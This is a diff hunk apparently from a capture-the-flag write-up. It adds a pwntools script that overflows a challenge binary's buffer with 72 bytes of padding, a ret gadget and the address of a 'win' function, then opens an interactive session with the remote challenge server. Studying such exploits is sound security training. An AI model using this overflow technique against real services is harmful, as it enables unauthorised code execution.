@@ -177,6 +177,23 @@ print(out.decode("latin-1", errors="ignore"))
 ```
 it connected to the challenge server and the program printed the flag:
 ```
+from pwn import *
+
+elf = ELF("./manipal")
+p = remote("propertyinmanipal.nitephase.live", 42586)
+
+p.recvuntil(b": ")
+p.sendline(b"A")
+
+p.recvuntil(b": ")
+
+payload = b"A"*72 + p64(next(elf.search(asm("ret")))) + p64(elf.symbols['win'])
+p.sendline(payload)
+
+p.interactive()
+
+```
+```
 root@92778709f62b:/work# python3 moresex.py
 [*] '/work/manipal'
     Arch:       amd64-64-little
